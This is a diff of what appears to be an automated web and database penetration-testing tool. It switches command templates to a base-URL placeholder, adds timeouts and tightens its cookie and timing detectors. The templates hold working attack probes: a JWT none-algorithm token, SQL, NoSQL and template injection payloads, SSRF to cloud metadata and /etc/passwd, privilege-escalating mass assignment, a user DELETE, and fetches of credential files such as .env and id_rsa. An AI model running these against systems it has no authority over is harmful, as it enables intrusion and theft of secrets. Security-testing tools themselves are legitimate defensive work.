-                "cmd_template": "echo '---NO AUTH---'; anon=$(curl -sk --max-time 8 'http://{target}/api/v1/admin' -o /dev/null -w '%{http_code}' 2>/dev/null); echo \"anon:$anon|\"; curl -sk --max-time 8 'http://{target}/api/v1/users' -o /dev/null -w 'users: %{http_code}\\n' 2>/dev/null; curl -sk --max-time 8 'http://{target}/api/v1/config' -o /dev/null -w 'config: %{http_code}\\n' 2>/dev/null; echo '---JWT NONE ALG---'; curl -sk --max-time 8 -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.' 'http://{target}/api/v1/admin' -o /dev/null -w 'jwt_none: %{http_code}\\n' 2>/dev/null; echo '---NULL TOKEN---'; curl -sk --max-time 8 -H 'Authorization: Bearer null' 'http://{target}/api/v1/users' -o /dev/null -w 'null_token: %{http_code}\\n' 2>/dev/null; echo '---NO TOKEN---'; curl -sk --max-time 8 'http://{target}/api/v1/profile' -o - 2>&1 | head -5",
+                "cmd_template": "echo '---NO AUTH---'; anon=$(curl -sk --max-time 8 '{base_url}/api/v1/admin' -o /dev/null -w '%{http_code}' 2>/dev/null); echo \"anon:$anon|\"; curl -sk --max-time 8 '{base_url}/api/v1/users' -o /dev/null -w 'users: %{http_code}\\n' 2>/dev/null; curl -sk --max-time 8 '{base_url}/api/v1/config' -o /dev/null -w 'config: %{http_code}\\n' 2>/dev/null; echo '---JWT NONE ALG---'; curl -sk --max-time 8 -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.' '{base_url}/api/v1/admin' -o /dev/null -w 'jwt_none: %{http_code}\\n' 2>/dev/null; echo '---NULL TOKEN---'; curl -sk --max-time 8 -H 'Authorization: Bearer null' '{base_url}/api/v1/users' -o /dev/null -w 'null_token: %{http_code}\\n' 2>/dev/null; echo '---NO TOKEN---'; curl -sk --max-time 8 '{base_url}/api/v1/profile' -o - 2>&1 | head -5",
                 "parse": "api_auth",
             },
             {
                 "id": "api_injection", "label": "API Injection Testing", "tool": "curl probes",
                 "description": "SQL injection, NoSQL injection, command injection and SSTI via API parameters.",
-                "cmd_template": "echo '---SQL INJECT---'; curl -sk --max-time 8 'http://{target}/api/v1/users?id=1%27' -o - 2>&1 | head -8; curl -sk --max-time 8 'http://{target}/api/v1/search?q=test%27+OR+1%3D1--' -o - 2>&1 | head -8; echo '---NOSQL INJECT---'; curl -sk --max-time 8 -X POST -H 'Content-Type: application/json' -d '{{\"username\":{{\"$gt\":\"\"}},\"password\":{{\"$gt\":\"\"}}}}' 'http://{target}/api/login' 2>&1 | head -8; curl -sk --max-time 8 -X POST -H 'Content-Type: application/json' -d '{{\"username\":{{\"$ne\":null}},\"password\":{{\"$ne\":null}}}}' 'http://{target}/api/v1/login' 2>&1 | head -8; echo '---SSTI PROBE---'; echo \"SSTI_RESULT:$(curl -sk --max-time 8 'http://{target}/api/v1/search?q={{7*7}}' -o - 2>&1 | head -c 80 | tr '\\n' ' ')\"; echo \"SSTI_RESULT:$(curl -sk --max-time 8 'http://{target}/api/v1/render?template={{7*7}}' -o - 2>&1 | head -c 80 | tr '\\n' ' ')\"",
+                "cmd_template": "echo '---SQL INJECT---'; curl -sk --max-time 8 '{base_url}/api/v1/users?id=1%27' -o - 2>&1 | head -8; curl -sk --max-time 8 '{base_url}/api/v1/search?q=test%27+OR+1%3D1--' -o - 2>&1 | head -8; echo '---NOSQL INJECT---'; curl -sk --max-time 8 -X POST -H 'Content-Type: application/json' -d '{{\"username\":{{\"$gt\":\"\"}},\"password\":{{\"$gt\":\"\"}}}}' '{base_url}/api/login' 2>&1 | head -8; curl -sk --max-time 8 -X POST -H 'Content-Type: application/json' -d '{{\"username\":{{\"$ne\":null}},\"password\":{{\"$ne\":null}}}}' '{base_url}/api/v1/login' 2>&1 | head -8; echo '---SSTI PROBE---'; echo \"SSTI_RESULT:$(curl -gsk --max-time 8 '{base_url}/api/v1/search?q={{{{7*7}}}}' -o - 2>&1 | head -c 80 | tr '\\n' ' ')\"; echo \"SSTI_RESULT:$(curl -gsk --max-time 8 '{base_url}/api/v1/render?template={{{{7*7}}}}' -o - 2>&1 | head -c 80 | tr '\\n' ' ')\"",
                 "parse": "api_injection",
             },
             {
                 "id": "api_ssrf", "label": "SSRF Detection", "tool": "curl probes",
                 "description": "Server-Side Request Forgery — test URL parameters for internal service access.",
-                "cmd_template": "echo '---SSRF PROBES---'; for param in url redirect next return callback dest destination link; do base=$(curl -skL --max-time 8 -o /dev/null -w '%{http_code}' \"http://{target}/api/v1/fetch?$param=0\" 2>/dev/null); imds=$(curl -skL --max-time 8 -w '%{http_code}' -o /tmp/pwm_ssrf_$$ \"http://{target}/api/v1/fetch?$param=http://169.254.169.254/latest/meta-data/\" 2>/dev/null); ibody=$(tr '\\n' ' ' < /tmp/pwm_ssrf_$$ 2>/dev/null | head -c 120); rm -f /tmp/pwm_ssrf_$$; local=$(curl -skL --max-time 8 -o /dev/null -w '%{http_code}' \"http://{target}/api/v1/proxy?$param=http://127.0.0.1:22\" 2>/dev/null); echo \"$param=baseline:$base|imds:$imds|$ibody|local22:$local\"; done; echo '---FILE SSRF---'; curl -skL --max-time 8 'http://{target}/api/v1/fetch?url=file:///etc/passwd' -o - 2>&1 | head -5",
+                "cmd_template": "echo '---SSRF PROBES---'; for param in url redirect next return callback dest destination link; do base=$(curl -skL --max-time 8 -o /dev/null -w '%{http_code}' \"{base_url}/api/v1/fetch?$param=0\" 2>/dev/null); imds=$(curl -skL --max-time 8 -w '%{http_code}' -o /tmp/pwm_ssrf_$$ \"{base_url}/api/v1/fetch?$param=http://169.254.169.254/latest/meta-data/\" 2>/dev/null); ibody=$(tr '\\n' ' ' < /tmp/pwm_ssrf_$$ 2>/dev/null | head -c 120); rm -f /tmp/pwm_ssrf_$$; local=$(curl -skL --max-time 8 -o /dev/null -w '%{http_code}' \"{base_url}/api/v1/proxy?$param=http://127.0.0.1:22\" 2>/dev/null); echo \"$param=baseline:$base|imds:$imds|$ibody|local22:$local\"; done; echo '---FILE SSRF---'; curl -skL --max-time 8 '{base_url}/api/v1/fetch?url=file:///etc/passwd' -o - 2>&1 | head -5",
                 "parse": "api_ssrf",
             },
             {
                 "id": "api_mass_assign", "label": "Mass Assignment / Overpost", "tool": "curl probes",
                 "description": "Broken Object Property Level Auth — test for mass assignment and privilege escalation via API body.",
-                "cmd_template": "echo '---MASS ASSIGN---'; curl -sk --max-time 8 -X PUT -H 'Content-Type: application/json' -d '{{\"role\":\"admin\",\"is_admin\":true,\"admin\":true,\"privilege\":\"admin\"}}' 'http://{target}/api/v1/users/1' -o - 2>&1 | head -8; curl -sk --max-time 8 -X PATCH -H 'Content-Type: application/json' -d '{{\"role\":\"superuser\",\"verified\":true,\"credits\":99999}}' 'http://{target}/api/v1/profile' -o - 2>&1 | head -8; echo '---FUNC LEVEL---'; del=$(curl -sk --max-time 8 -X DELETE 'http://{target}/api/v1/users/1' -o /dev/null -w '%{http_code}' 2>/dev/null); echo \"DELETE user:$del|\"; au=$(curl -sk --max-time 8 'http://{target}/api/v1/admin/users' 2>/dev/null | tr '\\n' ' ' | head -c 180); auc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/api/v1/admin/users' 2>/dev/null); echo \"admin/users:$auc|$au\"; idb=$(curl -sk --max-time 8 'http://{target}/api/v1/internal/debug' 2>/dev/null | tr '\\n' ' ' | head -c 180); idc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/api/v1/internal/debug' 2>/dev/null); echo \"internal/debug:$idc|$idb\"",
+                "cmd_template": "echo '---MASS ASSIGN---'; curl -sk --max-time 8 -X PUT -H 'Content-Type: application/json' -d '{{\"role\":\"admin\",\"is_admin\":true,\"admin\":true,\"privilege\":\"admin\"}}' '{base_url}/api/v1/users/1' -o - 2>&1 | head -8; curl -sk --max-time 8 -X PATCH -H 'Content-Type: application/json' -d '{{\"role\":\"superuser\",\"verified\":true,\"credits\":99999}}' '{base_url}/api/v1/profile' -o - 2>&1 | head -8; echo '---FUNC LEVEL---'; del=$(curl -sk --max-time 8 -X DELETE '{base_url}/api/v1/users/1' -o /dev/null -w '%{http_code}' 2>/dev/null); echo \"DELETE user:$del|\"; au=$(curl -sk --max-time 8 '{base_url}/api/v1/admin/users' 2>/dev/null | tr '\\n' ' ' | head -c 180); auc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' '{base_url}/api/v1/admin/users' 2>/dev/null); echo \"admin/users:$auc|$au\"; idb=$(curl -sk --max-time 8 '{base_url}/api/v1/internal/debug' 2>/dev/null | tr '\\n' ' ' | head -c 180); idc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' '{base_url}/api/v1/internal/debug' 2>/dev/null); echo \"internal/debug:$idc|$idb\"",
                 "parse": "api_mass_assign",
             },
             {
                 "id": "api_misc", "label": "API Misconfiguration & Rate Limit", "tool": "curl probes",
                 "description": "Security misconfigs, missing rate limiting, CORS, verbose errors, third-party API exposure.",
-                "cmd_template": "echo '---CORS---'; curl -skL -H 'Origin: https://evil.com' -I 'http://{target}/api/v1/users' 2>&1 | grep -i 'access-control'; echo '---RATE LIMIT TEST---'; for i in $(seq 1 15); do curl -sk -o /dev/null -w '%{http_code} ' 'http://{target}/api/v1/login' -d 'user=admin&pass=test'; done; echo ''; echo '---VERBOSE ERROR---'; curl -sk 'http://{target}/api/v1/users/INVALID_ID' -o - 2>&1 | head -10; curl -sk -X POST -H 'Content-Type: application/json' -d '{{\"bad\":\"json\"' 'http://{target}/api/v1/users' -o - 2>&1 | head -10; echo '---THIRD PARTY KEYS---'; curl -sk 'http://{target}/api/v1/config' -o - 2>&1 | grep -iE 'api_key|secret|token|password|key|credential' | head -10",
+                "cmd_template": "echo '---CORS---'; curl --max-time 12 -skL -H 'Origin: https://evil.com' -I '{base_url}/api/v1/users' 2>&1 | grep -i 'access-control'; echo '---RATE LIMIT TEST---'; for i in $(seq 1 15); do curl --max-time 12 -sk -o /dev/null -w '%{http_code} ' '{base_url}/api/v1/login' -d 'user=admin&pass=test'; done; echo ''; echo '---VERBOSE ERROR---'; curl --max-time 12 -sk '{base_url}/api/v1/users/INVALID_ID' -o - 2>&1 | head -10; curl --max-time 12 -sk -X POST -H 'Content-Type: application/json' -d '{{\"bad\":\"json\"' '{base_url}/api/v1/users' -o - 2>&1 | head -10; echo '---THIRD PARTY KEYS---'; curl --max-time 12 -sk '{base_url}/api/v1/config' -o - 2>&1 | grep -iE 'api_key|secret|token|password|key|credential' | head -10",
                 "parse": "api_misc",
             },
         ],
@@ -441,7 +441,7 @@ CHAIN = [
             {
                 "id": "db_unauth", "label": "Unauthenticated DB Access", "tool": "nmap NSE / curl / redis-cli",
                 "description": "Test for unauthenticated access to all exposed database services.",
-                "cmd_template": "echo '---REDIS UNAUTH---'; redis-cli -h {target} -p 6379 --no-auth-warning ping 2>&1 | head -5; redis-cli -h {target} -p 6379 --no-auth-warning info server 2>&1 | head -10; redis-cli -h {target} -p 6379 --no-auth-warning CONFIG GET requirepass 2>&1 | head -5; echo '---MONGODB UNAUTH---'; curl -sk 'http://{target}:27017' -o - 2>&1 | head -5; nmap --script=mongodb-info,mongodb-databases -p 27017 {target} 2>&1 | head -30; echo '---ELASTICSEARCH---'; curl -sk 'http://{target}:9200/_cat/indices?v' 2>&1 | head -20; curl -sk 'http://{target}:9200/_cluster/health' 2>&1 | head -10; curl -sk 'http://{target}:9200/_nodes' 2>&1 | head -15; echo '---COUCHDB---'; curl -sk 'http://{target}:5984/_all_dbs' 2>&1 | head -5; echo '---INFLUXDB---'; curl -sk 'http://{target}:8086/query?q=SHOW+DATABASES' 2>&1 | head -5; echo '---MEMCACHED---'; nmap --script=memcached-info -p 11211 {target} 2>&1 | head -20",
+                "cmd_template": "echo '---REDIS UNAUTH---'; redis-cli -h {target} -p 6379 --no-auth-warning ping 2>&1 | head -5; redis-cli -h {target} -p 6379 --no-auth-warning info server 2>&1 | head -10; redis-cli -h {target} -p 6379 --no-auth-warning CONFIG GET requirepass 2>&1 | head -5; echo '---MONGODB UNAUTH---'; curl --max-time 12 -sk 'http://{target}:27017' -o - 2>&1 | head -5; nmap --script=mongodb-info,mongodb-databases -p 27017 {target} 2>&1 | head -30; echo '---ELASTICSEARCH---'; curl --max-time 12 -sk 'http://{target}:9200/_cat/indices?v' 2>&1 | head -20; curl --max-time 12 -sk 'http://{target}:9200/_cluster/health' 2>&1 | head -10; curl --max-time 12 -sk 'http://{target}:9200/_nodes' 2>&1 | head -15; echo '---COUCHDB---'; curl --max-time 12 -sk 'http://{target}:5984/_all_dbs' 2>&1 | head -5; echo '---INFLUXDB---'; curl --max-time 12 -sk 'http://{target}:8086/query?q=SHOW+DATABASES' 2>&1 | head -5; echo '---MEMCACHED---'; nmap --script=memcached-info -p 11211 {target} 2>&1 | head -20",
                 "parse": "db_unauth",
             },
             {
@@ -454,33 +454,33 @@ CHAIN = [
             {
                 "id": "db_sqlmap", "label": "sqlmap — Deep SQL Injection Audit", "tool": "sqlmap",
                 "description": "Automated SQL injection detection and database fingerprinting using sqlmap across GET/POST parameters and forms. Detection and enumeration only.",
-                "cmd_template": "echo '---SQLMAP GET PARAMS---'; sqlmap -u 'http://{target}/?id=1' --batch --level=3 --risk=2 --technique=BEUST --threads=5 --dbs --banner --current-user --current-db --output-dir={outdir}/sqlmap_get 2>&1 | tail -40; echo '---SQLMAP FORMS---'; sqlmap -u 'http://{target}/' --forms --batch --level=3 --risk=2 --technique=BEUST --threads=5 --dbs --output-dir={outdir}/sqlmap_forms 2>&1 | tail -30; echo '---SQLMAP LOGIN---'; sqlmap -u 'http://{target}/login' --data='username=admin&password=test' --batch --level=3 --risk=2 --technique=BEUST --output-dir={outdir}/sqlmap_login 2>&1 | tail -20; echo '---SQLMAP SEARCH---'; sqlmap -u 'http://{target}/search?q=test' --batch --level=3 --risk=2 --technique=BEUST --output-dir={outdir}/sqlmap_search 2>&1 | tail -20",
+                "cmd_template": "echo '---SQLMAP GET PARAMS---'; sqlmap -u '{base_url}/?id=1' --batch --level=3 --risk=2 --technique=BEUST --threads=5 --dbs --banner --current-user --current-db --output-dir={outdir}/sqlmap_get 2>&1 | tail -40; echo '---SQLMAP FORMS---'; sqlmap -u '{base_url}/' --forms --batch --level=3 --risk=2 --technique=BEUST --threads=5 --dbs --output-dir={outdir}/sqlmap_forms 2>&1 | tail -30; echo '---SQLMAP LOGIN---'; sqlmap -u '{base_url}/login' --data='username=admin&password=test' --batch --level=3 --risk=2 --technique=BEUST --output-dir={outdir}/sqlmap_login 2>&1 | tail -20; echo '---SQLMAP SEARCH---'; sqlmap -u '{base_url}/search?q=test' --batch --level=3 --risk=2 --technique=BEUST --output-dir={outdir}/sqlmap_search 2>&1 | tail -20",
                 "fallback_cmd": "echo '[sqlmap not installed] apt-get install sqlmap'",
                 "parse": "sqlmap",
             },
             {
                 "id": "db_sqli", "label": "Manual SQL Injection Probes", "tool": "curl / nmap NSE",
                 "description": "Error-based, time-based, boolean-based and union-based SQL injection probes.",
-                "cmd_template": "echo '---ERROR BASED SQLi---'; for payload in \"'\" \"''\" \"' OR '1'='1\" \"' OR 1=1--\" \"1; SELECT 1\" \"1 UNION SELECT NULL--\" \"1 AND 1=2\"; do encoded=$(python3 -c \"import urllib.parse; print(urllib.parse.quote('$payload'))\" 2>/dev/null || echo '%27'); resp=$(curl -sk \"http://{target}/?id=$encoded\" -o - 2>&1 | grep -iE 'sql|mysql|syntax|error|warning|ORA-' | head -2); echo \"PAYLOAD[$payload]: $resp\"; done; echo '---TIME BASED---'; t1=$(curl -sk -o /dev/null -w '%{time_total}' \"http://{target}/?id=1+AND+SLEEP(4)\" 2>/dev/null); t2=$(curl -sk -o /dev/null -w '%{time_total}' \"http://{target}/?id=1\" 2>/dev/null); echo \"sleep_probe=${t1}s baseline=${t2}s\"; echo '---POST SQLI---'; curl -sk -X POST -d \"username='&password=test\" 'http://{target}/login' -o - 2>&1 | head -5",
+                "cmd_template": "echo '---ERROR BASED SQLi---'; for payload in \"'\" \"''\" \"' OR '1'='1\" \"' OR 1=1--\" \"1; SELECT 1\" \"1 UNION SELECT NULL--\" \"1 AND 1=2\"; do encoded=$(python3 -c \"import urllib.parse; print(urllib.parse.quote('$payload'))\" 2>/dev/null || echo '%27'); resp=$(curl --max-time 12 -sk \"{base_url}/?id=$encoded\" -o - 2>&1 | grep -iE 'sql|mysql|syntax|error|warning|ORA-' | head -2); echo \"PAYLOAD[$payload]: $resp\"; done; echo '---TIME BASED---'; t1=$(curl --max-time 20 -sk -o /dev/null -w '%{time_total}' \"{base_url}/?id=1+AND+SLEEP(4)\" 2>/dev/null); t2=$(curl --max-time 12 -sk -o /dev/null -w '%{time_total}' \"{base_url}/?id=1\" 2>/dev/null); echo \"sleep_probe=${t1}s baseline=${t2}s\"; echo '---POST SQLI---'; curl --max-time 12 -sk -X POST -d \"username='&password=test\" '{base_url}/login' -o - 2>&1 | head -5",
                 "parse": "db_sqli",
             },
             {
                 "id": "db_nosql", "label": "NoSQL Injection Detection", "tool": "curl probes",
                 "description": "MongoDB, Redis and Cassandra operator injection, authentication bypass.",
-                "cmd_template": "echo '---NOSQL OPERATOR INJECT---'; curl -sk -X POST -H 'Content-Type: application/json' -d '{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}' 'http://{target}/login' -o - 2>&1 | head -8; curl -sk -X POST -H 'Content-Type: application/json' -d '{\"username\":{\"$regex\":\".*\"},\"password\":{\"$regex\":\".*\"}}' 'http://{target}/api/login' -o - 2>&1 | head -8; curl -sk -X POST -H 'Content-Type: application/json' -d '{\"$where\":\"1==1\"}' 'http://{target}/api/v1/users' -o - 2>&1 | head -8; echo '---REDIS CMD INJECT---'; redis-cli -h {target} -p 6379 --no-auth-warning CONFIG GET requirepass 2>&1 | head -5; redis-cli -h {target} -p 6379 --no-auth-warning KEYS '*' 2>&1 | head -20",
+                "cmd_template": "echo '---NOSQL OPERATOR INJECT---'; curl --max-time 12 -sk -X POST -H 'Content-Type: application/json' -d '{{\"username\":{{\"$gt\":\"\"}},\"password\":{{\"$gt\":\"\"}}}}' '{base_url}/login' -o - 2>&1 | head -8; curl --max-time 12 -sk -X POST -H 'Content-Type: application/json' -d '{{\"username\":{{\"$regex\":\".*\"}},\"password\":{{\"$regex\":\".*\"}}}}' '{base_url}/api/login' -o - 2>&1 | head -8; curl --max-time 12 -sk -X POST -H 'Content-Type: application/json' -d '{{\"$where\":\"1==1\"}}' '{base_url}/api/v1/users' -o - 2>&1 | head -8; echo '---REDIS CMD INJECT---'; redis-cli -h {target} -p 6379 --no-auth-warning CONFIG GET requirepass 2>&1 | tail -1 | sed 's/^/REQUIREPASS:/'; redis-cli -h {target} -p 6379 --no-auth-warning KEYS '*' 2>&1 | sed 's/^/KEY:/' | head -20",
                 "parse": "db_nosql",
             },
             {
                 "id": "db_privesc", "label": "DB Privilege & Config Audit", "tool": "nmap NSE / curl",
                 "description": "Excessive privileges, verbose errors, missing encryption, audit logging, stored procedures.",
-                "cmd_template": "echo '---MYSQL PRIVS---'; nmap --script=mysql-info,mysql-variables,mysql-audit -p 3306 {target} 2>&1 | head -50; echo '---POSTGRES INFO---'; nmap --script=pgsql-info -p 5432 {target} 2>&1 | head -30; echo '---MSSQL INFO---'; nmap --script=ms-sql-info,ms-sql-config,ms-sql-xp-cmdshell -p 1433 {target} 2>&1 | head -40; echo '---ELASTIC SECURITY---'; curl -sk 'http://{target}:9200/_xpack/security?pretty' 2>&1 | head -10; echo '---VERBOSE DB ERRORS---'; curl -sk http://{target}/?id=1%27 -o - 2>&1 | grep -iE 'sql|mysql|syntax error|ora-' | head -10",
+                "cmd_template": "echo '---MYSQL PRIVS---'; nmap --script=mysql-info,mysql-variables,mysql-audit -p 3306 {target} 2>&1 | head -50; echo '---POSTGRES INFO---'; nmap --script=pgsql-info -p 5432 {target} 2>&1 | head -30; echo '---MSSQL INFO---'; nmap --script=ms-sql-info,ms-sql-config,ms-sql-xp-cmdshell -p 1433 {target} 2>&1 | head -40; echo '---ELASTIC SECURITY---'; curl --max-time 12 -sk 'http://{target}:9200/_xpack/security?pretty' 2>&1 | head -10; echo '---VERBOSE DB ERRORS---'; curl --max-time 12 -sk {base_url}/?id=1%27 -o - 2>&1 | grep -iE 'sql|mysql|syntax error|ora-' | head -10",
                 "parse": "db_privesc",
             },
             {
                 "id": "db_second_order", "label": "Second-Order SQLi & Stored Payloads", "tool": "sqlmap / curl",
                 "description": "Detect second-order SQL injection by registering payloads and observing trigger points.",
-                "cmd_template": "echo '---REGISTER PAYLOAD---'; curl -sk -X POST -H 'Content-Type: application/json' -d \"{\\\"username\\\":\\\"admin' OR 1=1--\\\",\\\"email\\\":\\\"test@test.com\\\",\\\"password\\\":\\\"test123\\\"}\" 'http://{target}/api/v1/register' -o - 2>&1 | head -5; echo '---CHECK PROFILE---'; curl -sk 'http://{target}/profile' -o - 2>&1 | grep -iE 'sql|error|syntax' | head -5; echo '---SQLMAP CRAWL---'; sqlmap -u 'http://{target}/' --crawl=2 --batch --level=2 --risk=1 --technique=B --output-dir={outdir}/sqlmap_crawl 2>&1 | tail -20",
-                "fallback_cmd": "echo '---SECOND ORDER PROBE---'; curl -sk -X POST -d \"username=admin'--&password=test\" 'http://{target}/register' -o - 2>&1 | head -5",
+                "cmd_template": "echo '---REGISTER PAYLOAD---'; curl --max-time 12 -sk -X POST -H 'Content-Type: application/json' -d \"{\\\"username\\\":\\\"admin' OR 1=1--\\\",\\\"email\\\":\\\"test@test.com\\\",\\\"password\\\":\\\"test123\\\"}\" '{base_url}/api/v1/register' -o - 2>&1 | head -5; echo '---CHECK PROFILE---'; curl --max-time 12 -sk '{base_url}/profile' -o - 2>&1 | grep -iE 'sql|error|syntax' | head -5; echo '---SQLMAP CRAWL---'; sqlmap -u '{base_url}/' --crawl=2 --batch --level=2 --risk=1 --technique=B --output-dir={outdir}/sqlmap_crawl 2>&1 | tail -20",
+                "fallback_cmd": "echo '---SECOND ORDER PROBE---'; curl --max-time 12 -sk -X POST -d \"username=admin'--&password=test\" '{base_url}/register' -o - 2>&1 | head -5",
                 "parse": "db_sqli",
             },
         ],
@@ -646,7 +646,7 @@ CHAIN = [
             {
                 "id": "ep_sqli_verify", "label": "sqlmap Injection Verification", "tool": "sqlmap",
                 "description": "Verify and enumerate confirmed SQL injection points. Banner, DBMS, current user, databases.",
-                "cmd_template": "timeout -k 5 1200 sqlmap -u 'http://{target}/?id=1' --batch --level=5 --risk=3 --technique=BEUSTQ --threads=10 --timeout=10 --retries=1 --banner --current-user --current-db --hostname --dbs --output-dir={outdir}/sqlmap_verify 2>&1 | tail -60",
+                "cmd_template": "timeout -k 5 1200 sqlmap -u '{base_url}/?id=1' --batch --level=5 --risk=3 --technique=BEUSTQ --threads=10 --timeout=10 --retries=1 --banner --current-user --current-db --hostname --dbs --output-dir={outdir}/sqlmap_verify 2>&1 | tail -60",
                 "fallback_cmd": "echo '[sqlmap not installed] apt-get install sqlmap'",
                 "parse": "sqlmap",
             },
@@ -685,13 +685,13 @@ CHAIN = [
             {
                 "id": "pe_hv_targets", "label": "High-Value Service Map", "tool": "nmap",
                 "description": "Probe for databases, Active Directory, backup services, secret stores, cloud metadata.",
-                "cmd_template": "nmap -sV -p 88,389,636,445,1433,1521,3306,5432,6379,9200,27017,5985,5986 --open -T4 {target} 2>&1; echo '---CLOUD METADATA---'; curl -sk 'http://169.254.169.254/latest/meta-data/' 2>&1 | head -10; curl -sk 'http://169.254.169.254/computeMetadata/v1/' -H 'Metadata-Flavor: Google' 2>&1 | head -10",
+                "cmd_template": "nmap -sV -p 88,389,636,445,1433,1521,3306,5432,6379,9200,27017,5985,5986 --open -T4 {target} 2>&1; echo '---CLOUD METADATA---'; curl --max-time 12 -sk 'http://169.254.169.254/latest/meta-data/' 2>&1 | head -10; curl --max-time 12 -sk 'http://169.254.169.254/computeMetadata/v1/' -H 'Metadata-Flavor: Google' 2>&1 | head -10",
                 "parse": "nmap",
             },
             {
                 "id": "pe_cred_harvest", "label": "Credential & Secret Harvesting", "tool": "curl / nmap",
                 "description": "Search for exposed credentials, keys, tokens in common paths and service responses.",
-                "cmd_template": "echo '---SECRET PATHS---'; for p in .env .env.local wp-config.php config.php config/database.yml application.properties secrets.yaml backup.sql database.sql id_rsa .git/config .aws/credentials; do out=$(curl -skL --max-time 8 -w '%{http_code}' -o /tmp/pwm_cred_$$ 'http://{target}/'$p 2>/dev/null); body=$(tr '\\n' ' ' < /tmp/pwm_cred_$$ 2>/dev/null | head -c 200); rm -f /tmp/pwm_cred_$$; echo \"$p:$out|$body\"; done; echo '---GIT EXPOSURE---'; curl -skL --max-time 8 http://{target}/.git/COMMIT_EDITMSG -o - 2>&1 | head -5; curl -skL --max-time 8 http://{target}/.git/config -o - 2>&1 | head -10",
+                "cmd_template": "echo '---SECRET PATHS---'; for p in .env .env.local wp-config.php config.php config/database.yml application.properties secrets.yaml backup.sql database.sql id_rsa .git/config .aws/credentials; do out=$(curl -skL --max-time 8 -w '%{http_code}' -o /tmp/pwm_cred_$$ '{base_url}/'$p 2>/dev/null); body=$(tr '\\n' ' ' < /tmp/pwm_cred_$$ 2>/dev/null | head -c 200); rm -f /tmp/pwm_cred_$$; echo \"$p:$out|$body\"; done; echo '---GIT EXPOSURE---'; curl -skL --max-time 8 {base_url}/.git/COMMIT_EDITMSG -o - 2>&1 | head -5; curl -skL --max-time 8 {base_url}/.git/config -o - 2>&1 | head -10",
                 "parse": "cred_harvest",
             },
             {
@@ -787,6 +787,26 @@ _WEAKNESS_OFF = re.compile(
     r"\bno\s+(?:support|heartbleed|rc4|sslv|tlsv)|\brejected\b", re.I)
 
 
+_COOKIE_FLAG_SIGS = {'Cookie missing HttpOnly flag': 'HttpOnly',
+                     'Cookie missing Secure flag': 'Secure'}
+
+
+def _session_cookie_missing_flag(line, flag):
+    """True only for a SESSION cookie's Set-Cookie line that lacks `flag`.
+
+    Any cookie without the flag used to satisfy these signatures, so a CSRF or
+    preference cookie produced "Cookie missing HttpOnly" on a hardened app that
+    sets its session cookie correctly.
+    """
+    m = re.search(r'set-cookie:\s*([^=;\s]+)=', line, re.I)
+    if not m:
+        return False
+    name = m.group(1)
+    if _COOKIE_CSRF_RE.search(name) or not _COOKIE_SESSION_RE.search(name):
+        return False
+    return flag.lower() not in line.lower()
+
+
 def sig_matches(output):
     """Line-based anomaly-signature scan yielding (msg, sev) once per signature.
 
@@ -802,6 +822,11 @@ def sig_matches(output):
             if msg in seen:
                 continue
             if off and msg in _AFFIRMATIVE_ONLY:
+                continue
+            if msg in _COOKIE_FLAG_SIGS:
+                if _session_cookie_missing_flag(line, _COOKIE_FLAG_SIGS[msg]):
+                    seen.add(msg)
+                    yield msg, sev
                 continue
             if re.search(sig, line, re.I):
                 seen.add(msg)
@@ -1129,7 +1154,7 @@ def _finding_url(f, sess):
         except Exception:
             base = ''
         if not base:
-            base = f"http://{target}"
+            base = f"{base_url}"
         return f"{base.rstrip('/')}{p}"
     m = re.search(r'https?://\S+', cmd)
     if m:
@@ -1321,6 +1346,10 @@ def infer_network(target):
 
 def make_cmd(template, sess):
     ports = sess.get('ports_found') or '21,22,23,25,53,80,110,443,445,3306,3389,8080'
+    base = _base_url(sess)
+    # {base_host} is the discovered host:port without a scheme, for probes that
+    # need a different scheme on the same port (e.g. https://{base_host}).
+    base_host = re.sub(r'^https?://', '', base).rstrip('/') if base else sess['target']
     # Every substituted value is shell-quoted: {banner_search} carries raw
     # target-controlled banner text and would otherwise be parsed as shell
     # syntax (command injection). For validated hostnames/IPs/ports/outdirs
@@ -1328,7 +1357,8 @@ def make_cmd(template, sess):
     vals = {
         'target': shlex.quote(sess['target']),
         'outdir': shlex.quote(sess['outdir']),
-        'base_url': shlex.quote(_base_url(sess)),
+        'base_url': shlex.quote(base),
+        'base_host': shlex.quote(base_host),
         'ports': shlex.quote(ports),
         'banner_search': shlex.quote(sess.get('banner_search', sess['target'])),
         'network': shlex.quote(sess.get('network', infer_network(sess['target']))),
@@ -1839,11 +1869,20 @@ def parse_http_anomaly(output):
             "command":"curl -skL 'http://<target>/admin'"})
     return findings
 
+# curl --max-time caps used by the timing templates. A measurement sitting at
+# the cap is a TIMED-OUT request, not a slow response — treating it as a delay
+# manufactured injection findings from a dead endpoint. Kept in sync with
+# deep_timing (12 s samples, 20 s SLEEP probe) and db_sqli (20 s SLEEP probe).
+CAP_PROBE = 12.0
+CAP_SLEEP = 20.0
+
+
 def parse_timing(output):
     findings = []
-    times = re.findall(r'\bt=([\d.]+)', output)
-    if len(times) >= 3:
-        vals = sorted(float(t) for t in times)
+    times = [float(t) for t in re.findall(r'\bt=([\d.]+)', output)]
+    # Samples at the cap mean the request never answered; they are not samples.
+    vals = sorted(t for t in times if t < CAP_PROBE - 0.5)
+    if len(vals) >= 3:
         med = vals[len(vals)//2]          # median: one slow probe must not set the bar
         mx = vals[-1]
         if med > 0 and mx > med * 2.5 and (mx - med) > 0.5:
@@ -1858,7 +1897,7 @@ def parse_timing(output):
         # Single samples each: network/cache jitter easily reaches 100-300 ms,
         # so a small delta is not an enumeration oracle. Real oracles are a
         # multiple apart (hashing vs no-user path), hence the ratio floor.
-        if (slow - fast) >= 0.4 and fast > 0 and slow >= fast * 2:
+        if (slow - fast) >= 0.4 and fast > 0 and slow >= fast * 2 and slow < CAP_PROBE - 0.5:
             findings.append({"type":"auth_timing_oracle","severity":"high","path":"/login",
